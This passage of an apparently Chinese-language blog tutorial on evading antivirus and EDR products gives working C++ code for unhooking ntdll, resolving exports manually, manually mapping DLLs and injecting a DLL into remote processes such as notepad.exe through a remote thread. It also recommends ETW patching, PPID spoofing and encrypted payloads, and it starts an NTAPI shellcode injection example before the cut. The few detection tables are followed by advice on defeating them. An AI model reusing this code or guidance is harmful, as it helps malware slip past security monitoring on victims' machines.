class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">UnhookNtdll</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 从磁盘打开干净的ntdll</span><br>    HANDLE hFile = <span class="hljs-built_in">CreateFileW</span>(<span class="hljs-string">L&quot;C:\\Windows\\System32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    DWORD size = <span class="hljs-built_in">GetFileSize</span>(hFile, <span class="hljs-literal">NULL</span>);<br>    BYTE* cleanNtdll = <span class="hljs-keyword">new</span> BYTE[size];<br>    <span class="hljs-built_in">ReadFile</span>(hFile, cleanNtdll, size, &amp;size, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 定位干净文件中的.text部分</span><br>    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanNtdll;<br>    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(cleanNtdll + dos-&gt;e_lfanew);<br>    PIMAGE_SECTION_HEADER section = <span class="hljs-built_in">IMAGE_FIRST_SECTION</span>(nt);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(section[i].Name, <span class="hljs-string">&quot;.text&quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// 覆盖内存中的钩住部分</span><br>            DWORD oldProtect;<br>            <span class="hljs-built_in">VirtualProtect</span>((LPVOID)(<span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>) + section[i].VirtualAddress),<br>                section[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br><br>            <span class="hljs-built_in">memcpy</span>((LPVOID)(<span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>) + section[i<br><br><br>].VirtualAddress),  <br>cleanNtdll + section[i].PointerToRawData, section[i].SizeOfRawData);<br><br><br>        <span class="hljs-built_in">VirtualProtect</span>((LPVOID)(<span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>) + section[i].VirtualAddress),<br>            section[i].Misc.VirtualSize, oldProtect, &amp;oldProtect);<br><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">delete</span>[] cleanNtdll;<br><span class="hljs-built_in">CloseHandle</span>(hFile);<br><br><br>&#125;<br><br>````<br><br>**为什么它有效**：EDR钩子只存在于内存中。如果您从磁盘加载并覆盖 `.text`，您就**移除了用户态钩子**，恢复了干净的系统调用存根。<br><br>---<br><br>### **<span class="hljs-number">3.4</span><span class="hljs-number">.7</span> – 手动解析导出表**<br><br>为了避免使用 `GetProcAddress`，攻击者可以直接解析**导出地址表（EAT）**并手动解析函数：<br><br>```<span class="hljs-function">cpp</span><br><span class="hljs-function">FARPROC <span class="hljs-title">ManualGetProcAddress</span><span class="hljs-params">(HMODULE hModule, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* funcName)</span> </span>&#123;<br>    BYTE* base = (BYTE*)hModule;<br>    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;<br>    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos-&gt;e_lfanew);<br>    IMAGE_DATA_DIRECTORY exportDir = nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];<br>    IMAGE_EXPORT_DIRECTORY* exportTable = (IMAGE_EXPORT_DIRECTORY*)(base + exportDir.VirtualAddress);<br><br>    DWORD* nameRVAs = (DWORD*)(base + exportTable-&gt;AddressOfNames);<br>    WORD* ordinals = (WORD*)(base + exportTable-&gt;AddressOfNameOrdinals);<br>    DWORD* funcs = (DWORD*)(base + exportTable-&gt;AddressOfFunctions);<br><br>    <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; exportTable-&gt;NumberOfNames; i++) &#123;<br>        <span class="hljs-type">char</span>* name = (<span class="hljs-type">char</span>*)(base + nameRVAs[i]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(name, funcName) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> (FARPROC)(base + funcs[ordinals[i]]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>````<br><br>**优点**：完全隐蔽的API解析，不触及 `GetProcAddress` 或触发已知的API断点。<br><br>---<br><br>### **<span class="hljs-number">3.4</span><span class="hljs-number">.8</span> – 在反射加载器和无文件恶意软件中使用**<br><br>许多反射DLL加载器（例如Cobalt Strike信标、Empire起始器）包括：<br><br>- 手动PE解析<br>  <br>- 自定义导入地址表（IAT）解析<br>  <br>- 导出和重定位解析<br>  <br>- 将段复制到内存中<br>  <br><br>反射加载**避免使用Windows加载器**，从而绕过DLL加载钩子和导入解析。<br><br>---<br><br> **实现这些技术的工具**<br><br>- **Donut** – 具有手动解析和PE注入的shellcode生成<br>  <br>- **sRDI** – 具有导出解析的shellcode反射DLL注入<br>  <br>- **TitanLdr** – 自定义用户态加载器，处理导出和重定位<br>  <br>- **HollowHunter** – 通过比较磁盘与内存来检测用户态钩子<br>  <br><br>---<br><br> **总结表格**<br><br>| 技术                       | 规避目标                |<br>| ------------------------ | ------------------- |<br>| `LdrLoadDll`             | 绕过 `LoadLibrary` 钩子 |<br>| `LdrGetProcedureAddress` | 绕过 `GetProcAddress` |<br>| `.text` 覆盖               | 移除内联钩子              |<br>| 手动解析EAT                  | 隐蔽API解析             |<br>| 反射加载                     | 不触发回调加载DLL          |<br>| 磁盘与内存比较                  | 检测EDR钩子存在           |<br><br>## **AV/EDR规避实战技术 - <span class="hljs-number">3.5</span> - 手动映射DLL和自定义加载器**<br><br>手动映射是一种技术，用于**在内存中加载DLL，而不使用标准的Windows API**，如 `LoadLibrary` 或 `LdrLoadDll`。这种方式可以避免触发监控DLL加载或导入的EDR钩子。<br><br>手动映射涉及解析PE文件格式、为DLL分配内存、手动复制各个段、应用重定位、手动解析导入并调用入口点——这些步骤都是通过程序化实现的。<br><br>该技术在恶意软件加载器、红队工具和shellcode构建器中得到了广泛应用。<br><br>---<br><br>### **<span class="hljs-number">3.5</span><span class="hljs-number">.1</span> 手动映射过程概述**<br><br>手动映射包含以下核心步骤：<br><br><span class="hljs-number">1.</span> **解析PE文件（DLL）**<br>   <br><span class="hljs-number">2.</span> **在目标进程中分配内存**<br>   <br><span class="hljs-number">3.</span> **将头文件和段复制到分配的内存中**<br>   <br><span class="hljs-number">4.</span> **如果基地址不同，修复重定位**<br>   <br><span class="hljs-number">5.</span> **手动解析导入**<br>   <br><span class="hljs-number">6.</span> **手动调用入口点（如 `DllMain`）**<br>   <br><br>---<br><br>### **<span class="hljs-number">3.5</span><span class="hljs-number">.2</span> 为什么手动映射可以绕过AV/EDR**<br><br>- **没有调用 `LoadLibrary` 或 `LdrLoadDll`** → 不触发DLL加载事件<br>  <br>- **没有使用导入地址表（IAT）** → 绕过导入钩子<br>  <br>- **入口点手动调用** → 没有类似 `LdrpCallInitRoutine` 的加载器回调<br>  <br>- **可以通过远程线程注入** → 完全隐蔽的注入<br>  <br><br>---<br><br>### **<span class="hljs-number">3.5</span><span class="hljs-number">.3</span> 基本手动映射实现（本地进程）**<br><br>**警告**：此代码是简化版本，仅适用于基本的、非复杂的以 `/ENTRY:DllMain` 编译的DLL。<br><br>```cpp<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">ManualMap</span><span class="hljs-params">(BYTE* dllBuffer)</span> </span>&#123;<br>    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBuffer;<br>    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBuffer + dos-&gt;e_lfanew);<br><br>    SIZE_T imageSize = nt-&gt;OptionalHeader.SizeOfImage;<br>    BYTE* remoteImage = (BYTE*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-keyword">if</span> (!remoteImage) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">// 复制头文件</span><br>    <span class="hljs-built_in">memcpy</span>(remoteImage, dllBuffer, nt-&gt;OptionalHeader.SizeOfHeaders);<br><br>    <span class="hljs-comment">// 复制段</span><br>    PIMAGE_SECTION_HEADER section = <span class="hljs-built_in">IMAGE_FIRST_SECTION</span>(nt);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;<br>        <span class="hljs-built_in">memcpy</span>(remoteImage + section[i].VirtualAddress,<br>               dllBuffer + section[i].PointerToRawData,<br>               section[i].SizeOfRawData);<br>    &#125;<br><br>    <span class="hljs-comment">// 重定位（简化版：假设是 IMAGE_REL_BASED_DIR64）</span><br>    DWORD delta = (DWORD_PTR)remoteImage - nt-&gt;OptionalHeader.ImageBase;<br>    <span class="hljs-keyword">if</span> (delta) &#123;<br>        IMAGE_DATA_DIRECTORY relocDir = nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];<br>        <span class="hljs-keyword">if</span> (relocDir.Size) &#123;<br>            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(remoteImage + relocDir.VirtualAddress);<br>            <span class="hljs-keyword">while</span> (reloc-&gt;VirtualAddress) &#123;<br>                DWORD count = (reloc-&gt;SizeOfBlock - <span class="hljs-built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="hljs-built_in">sizeof</span>(WORD);<br>                WORD* relocData = (WORD*)(reloc + <span class="hljs-number">1</span>);<br>                <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; count; i++) &#123;<br>                    <span class="hljs-keyword">if</span> ((relocData[i] &gt;&gt; <span class="hljs-number">12</span>) == IMAGE_REL_BASED_DIR64) &#123;<br>                        DWORD64* patch = (DWORD64*)(remoteImage + reloc-&gt;VirtualAddress + (relocData[i] &amp; <span class="hljs-number">0xFFF</span>));<br>                        *patch += delta;<br>                    &#125;<br>                &#125;<br>                reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc-&gt;SizeOfBlock);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 入口点</span><br>    DWORD entryRVA = nt-&gt;OptionalHeader.AddressOfEntryPoint;<br>    <span class="hljs-keyword">auto</span> DllMain = (<span class="hljs-built_in">BOOL</span>(WINAPI*)(HINSTANCE, DWORD, LPVOID))(remoteImage + entryRVA);<br>    <span class="hljs-built_in">DllMain</span>((HINSTANCE)remoteImage, DLL_PROCESS_ATTACH, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="使用示例："><a href="#使用示例：" class="headerlink" title="使用示例："></a>使用示例：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function">std::ifstream <span class="hljs-title">file</span><span class="hljs-params">(<span class="hljs-string">&quot;mydll.dll&quot;</span>, std::ios::binary)</span></span>;<br>    <span class="hljs-function">std::vector&lt;BYTE&gt; <span class="hljs-title">buffer</span><span class="hljs-params">(std::istreambuf_iterator&lt;<span class="hljs-type">char</span>&gt;(file), &#123;&#125;)</span></span>;<br>    <span class="hljs-built_in">ManualMap</span>(buffer.<span class="hljs-built_in">data</span>());<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="3-5-4-注释和实际应用案例"><a href="#3-5-4-注释和实际应用案例" class="headerlink" title="3.5.4 注释和实际应用案例"></a><strong>3.5.4 注释和实际应用案例</strong></h3><ul>
<li><p><strong>恶意软件</strong>：大多数现代无文件恶意软件通过使用上述技术的变种手动加载DLL。</p>
</li>
<li><p><strong>Cobalt Strike</strong>：反射DLL使用手动映射的形式加载。</p>
</li>
<li><p><strong>后期利用框架</strong>：自定义加载器用于绕过AMSI和EDR，避免使用系统API。</p>
</li>
<li><p><strong>代码注入</strong>：在远程进程注入时使用手动映射（例如，在游戏作弊、恶意软件分发器中）。</p>
</li>
</ul>
<hr>
<h3 id="3-5-5-反检测好处"><a href="#3-5-5-反检测好处" class="headerlink" title="3.5.5 反检测好处"></a><strong>3.5.5 反检测好处</strong></h3><table>
<thead>
<tr>
<th>特性</th>
<th>优势</th>
</tr>
</thead>
<tbody><tr>
<td>不使用 <code>LoadLibrary</code></td>
<td>日志或ETW中没有DLL加载事件</td>
</tr>
<tr>
<td>不使用导入表</td>
<td>避开导入地址钩子</td>
</tr>
<tr>
<td>没有加载的模块注册</td>
<td>不出现在 <code>LdrDataTableEntry</code> 中</td>
</tr>
<tr>
<td>自定义内存权限</td>
<td>避免PAGE_EXECUTE_READ的启发式检测</td>
</tr>
</tbody></table>
<hr>
<h3 id="3-5-6-限制和检测向量"><a href="#3-5-6-限制和检测向量" class="headerlink" title="3.5.6 限制和检测向量"></a><strong>3.5.6 限制和检测向量</strong></h3><p>即使是手动映射也可以被检测到，特别是：</p>
<ul>
<li><p><code>.data</code> 或 <code>.text</code> 段在执行期间被写入（被内存监视器追踪）</p>
</li>
<li><p>内存区域标记为 <code>RWX</code>（常见的启发式标志）</p>
</li>
<li><p>异常的内存布局（与标准PE加载器不匹配）</p>
</li>
<li><p>入口点执行模式被ETW或用户态API监控检测</p>
</li>
<li><p>反射加载器模式（如已知的起始shell）被扫描</p>
</li>
</ul>
<p><strong>检测示例</strong>：</p>
<ul>
<li><p><strong>Sysmon事件ID 7</strong>：手动注入的DLL没有<code>LoadLibrary</code>记录</p>
</li>
<li><p><strong>ETW进程转储</strong>：ETW提供程序如 <code>ImageLoad</code> 不会注册这些DLL</p>
</li>
<li><p><strong>内存扫描工具</strong>：如Volatility或Hunt-Sleeping-Beacons能检测到手动映射的PE文件</p>
</li>
</ul>
<hr>
<h3 id="3-5-7-远程手动映射（注入其他进程）"><a href="#3-5-7-远程手动映射（注入其他进程）" class="headerlink" title="3.5.7 远程手动映射（注入其他进程）"></a><strong>3.5.7 远程手动映射（注入其他进程）</strong></h3><h4 id="目标："><a href="#目标：" class="headerlink" title="目标："></a><strong>目标：</strong></h4><p>在<strong>远程进程</strong>（例如 <code>explorer.exe</code>, <code>notepad.exe</code>）的内存中加载DLL，**无需使用 <code>LoadLibrary</code>**，以规避遥测、ETW事件和API钩子。</p>
<hr>
<h4 id="远程映射步骤概述："><a href="#远程映射步骤概述：" class="headerlink" title="远程映射步骤概述："></a><strong>远程映射步骤概述：</strong></h4><ol>
<li><p><strong>将DLL读取到内存（本地）</strong></p>
</li>
<li><p><strong>以足够的权限打开目标进程</strong></p>
</li>
<li><p><strong>在目标进程中分配内存（<code>VirtualAllocEx</code>）</strong></p>
</li>
<li><p><strong>将DLL头文件和段写入目标进程内存（<code>WriteProcessMemory</code>）</strong></p>
</li>
<li><p><strong>手动解析重定位和导入（适应远程环境）</strong></p>
</li>
<li><p><strong>创建远程线程执行DLL的入口点</strong></p>
</li>
</ol>
<hr>
<h4 id="高层代码（Windows-API）："><a href="#高层代码（Windows-API）：" class="headerlink" title="高层代码（Windows API）："></a><strong>高层代码（Windows API）</strong>：</h4><p>以下代码分为几部分，以便解释每个步骤。</p>
<hr>
<h4 id="第1步：将DLL读取到内存"><a href="#第1步：将DLL读取到内存" class="headerlink" title="第1步：将DLL读取到内存"></a><strong>第1步：将DLL读取到内存</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">std::ifstream <span class="hljs-title">file</span><span class="hljs-params">(<span class="hljs-string">&quot;stealth.dll&quot;</span>, std::ios::binary)</span></span>;<br><span class="hljs-function">std::vector&lt;BYTE&gt; <span class="hljs-title">dllBuffer</span><span class="hljs-params">(std::istreambuf_iterator&lt;<span class="hljs-type">char</span>&gt;(file), &#123;&#125;)</span></span>;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="第2步：打开目标进程"><a href="#第2步：打开目标进程" class="headerlink" title="第2步：打开目标进程"></a><strong>第2步：打开目标进程</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DWORD pid = <span class="hljs-built_in">GetTargetPID</span>(<span class="hljs-string">&quot;notepad.exe&quot;</span>); <span class="hljs-comment">// 使用ToolHelp API获取进程ID</span><br>HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br><span class="hljs-keyword">if</span> (!hProcess) &#123;<br>    std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to open target process\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="第3步：为DLL图像分配内存"><a href="#第3步：为DLL图像分配内存" class="headerlink" title="第3步：为DLL图像分配内存"></a><strong>第3步：为DLL图像分配内存</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBuffer.<span class="hljs-built_in">data</span>() + ((PIMAGE_DOS_HEADER)dllBuffer.<span class="hljs-built_in">data</span>())-&gt;e_lfanew);<br>SIZE_T imageSize = nt-&gt;OptionalHeader.SizeOfImage;<br><br>LPVOID remoteImage = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="第4步：写入头文件和段"><a href="#第4步：写入头文件和段" class="headerlink" title="第4步：写入头文件和段"></a><strong>第4步：写入头文件和段</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 写入PE头</span><br><span class="hljs-built_in">WriteProcessMemory</span>(hProcess, remoteImage, dllBuffer.<span class="hljs-built_in">data</span>(), nt-&gt;OptionalHeader.SizeOfHeaders, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">// 写入各个段</span><br>PIMAGE_SECTION_HEADER section = <span class="hljs-built_in">IMAGE_FIRST_SECTION</span>(nt);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;<br>    LPVOID remoteSectionAddr = (BYTE*)remoteImage + section[i].VirtualAddress;<br>    LPVOID localSectionAddr = dllBuffer.<span class="hljs-built_in">data</span>() + section[i].PointerToRawData;<br><br>    <span class="hljs-built_in">WriteProcessMemory</span><br><br><br>(hProcess, remoteSectionAddr, localSectionAddr, section[i].SizeOfRawData, <span class="hljs-literal">NULL</span>);  <br>&#125;<br><br>````<br><br>---<br><br>#### **第<span class="hljs-number">5</span>步：构建并注入加载器stub**<br><br>```<span class="hljs-function">cpp</span><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">LoaderStub</span><span class="hljs-params">(LPVOID lpParameter)</span> </span>&#123;<br>    LPVOID baseAddress = lpParameter;<br>    <span class="hljs-comment">// 修复重定位...</span><br>    <span class="hljs-comment">// 解析导入...</span><br>    <span class="hljs-comment">// 调用入口点（DllMain）</span><br><br>    <span class="hljs-keyword">auto</span> nt = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress + ((PIMAGE_DOS_HEADER)baseAddress)-&gt;e_lfanew);<br>    <span class="hljs-keyword">auto</span> entryPoint = (FARPROC)((BYTE*)baseAddress + nt-&gt;OptionalHeader.AddressOfEntryPoint);<br><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* DLLMAIN)</span><span class="hljs-params">(HINSTANCE, DWORD, LPVOID)</span></span>;<br>    ((DLLMAIN)entryPoint)((HINSTANCE)baseAddress, DLL_PROCESS_ATTACH, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>````<br><br>---<br><br>#### **第<span class="hljs-number">6</span>步：创建远程线程执行stub**<br><br>```cpp<br>HANDLE hThread = <span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>,<br>    (LPTHREAD_START_ROUTINE)((BYTE*)remoteImage + loaderOffset),  <span class="hljs-comment">// 加载器stub的地址</span><br>    remoteImage, <span class="hljs-comment">// 参数：DLL的基址</span><br>    <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>

<p>您还可以使用 <code>NtCreateThreadEx</code> 进行更隐蔽的注入。</p>
<hr>
<h4 id="高级增强："><a href="#高级增强：" class="headerlink" title="高级增强："></a><strong>高级增强：</strong></h4><ul>
<li><p>**基于系统调用的 <code>VirtualAllocEx</code> &#x2F; <code>WriteProcessMemory</code>**：使用直接的系统调用包装器避免检测</p>
</li>
<li><p><strong>在当前进程中解除NTDLL钩子</strong>：防止系统调用stubs被拦截</p>
</li>
<li><p><strong>PPID伪装</strong>：在注入前伪装目标进程的父进程</p>
</li>
<li><p><strong>ETW修补</strong>：注入前修补ETW，进一步提高隐蔽性</p>
</li>
<li><p><strong>内存中的DLL加密</strong>：加密DLL直到加载器运行</p>
</li>
</ul>
<hr>
<h4 id="实际应用案例："><a href="#实际应用案例：" class="headerlink" title="实际应用案例："></a><strong>实际应用案例：</strong></h4><ul>
<li><p>**Cobalt Strike的 <code>Beacon.dll</code>**：通过手动映射注入牺牲进程</p>
</li>
<li><p><strong>Metasploit的Meterpreter注入</strong>：使用反射加载技术，结构类似</p>
</li>
<li><p><strong>APT恶意软件如FIN7 和 APT29</strong>：使用加密DLL和自定义加载器绕过EDR</p>
</li>
</ul>
<hr>
<h4 id="检测技术（蓝队警觉性）："><a href="#检测技术（蓝队警觉性）：" class="headerlink" title="检测技术（蓝队警觉性）："></a><strong>检测技术（蓝队警觉性）：</strong></h4><table>
<thead>
<tr>
<th>技术</th>
<th>检测方法</th>
</tr>
</thead>
<tbody><tr>
<td>RWX内存区域</td>
<td>由EDR监控（如通过ETW）</td>
</tr>
<tr>
<td>DLL不在模块列表中</td>
<td>通过EnumProcessModules不匹配检测</td>
</tr>
<tr>
<td>线程上下文异常</td>
<td>入口点与已知模块不匹配</td>
</tr>
<tr>
<td>内存扫描工具</td>
<td>检查私有内存中的PE头</td>
</tr>
</tbody></table>
<p>为了规避这些，结合以下技术使用：</p>
<ul>
<li><p><strong>内存补丁</strong></p>
</li>
<li><p><strong>混淆的PE结构</strong></p>
</li>
<li><p><strong>加密负载+分阶段解密</strong></p>
</li>
</ul>
<h2 id="AV-EDR规避实战技术-3-6-仅使用NTAPI的Stagers"><a href="#AV-EDR规避实战技术-3-6-仅使用NTAPI的Stagers" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 3.6 - 仅使用NTAPI的Stagers"></a><strong>AV&#x2F;EDR规避实战技术 - 3.6 - 仅使用NTAPI的Stagers</strong></h2><h3 id="目标：-1"><a href="#目标：-1" class="headerlink" title="目标："></a><strong>目标：</strong></h3><p>使用直接的NTAPI（本地API）函数，代替标准的Win32 API（如 <code>LoadLibrary</code>、<code>CreateRemoteThread</code>），绕过EDR中通常设置的API钩子，这些钩子通常存在于 <code>kernel32.dll</code>、<code>advapi32.dll</code> 等库中。</p>
<hr>
<h3 id="为什么选择NTAPI？"><a href="#为什么选择NTAPI？" class="headerlink" title="为什么选择NTAPI？"></a><strong>为什么选择NTAPI？</strong></h3><ul>
<li><p><strong>NTAPI函数</strong>位于<code>ntdll.dll</code>中，通常<strong>未被钩取</strong>（或更容易解除钩取）。</p>
</li>
<li><p>大多数AV&#x2F;EDR钩取较高层次的WinAPI，如 <code>OpenProcess</code>、<code>WriteProcessMemory</code> 等。</p>
</li>
<li><p>使用NTAPI可以减少遥测数据并提高隐蔽性，尤其是在结合<strong>未被钩取的ntdll</strong>时。</p>
</li>
</ul>
<hr>
<h3 id="示例：基于NTAPI的远程Shellcode注入"><a href="#示例：基于NTAPI的远程Shellcode注入" class="headerlink" title="示例：基于NTAPI的远程Shellcode注入"></a><strong>示例：基于NTAPI的远程Shellcode注入</strong></h3><p>我们将使用<code>NtOpenProcess</code>、<code>NtAllocateVirtualMemory</code>、<code>NtWriteVirtualMemory</code> 和 <code>NtCreateThreadEx</code> 注入Shellcode到远程进程中。</p>
<hr>
<h3 id="逐步实现NTAPI注入（C-）"><a href="#逐步实现NTAPI注入（C-）" class="headerlink" title="逐步实现NTAPI注入（C++）"></a><strong>逐步实现NTAPI注入（C++）</strong></h3><blockquote>
<p>注意：此代码需要链接 <code>ntdll.lib</code> 或动态解析系统调用stubs。</p>
</blockquote>
<hr>
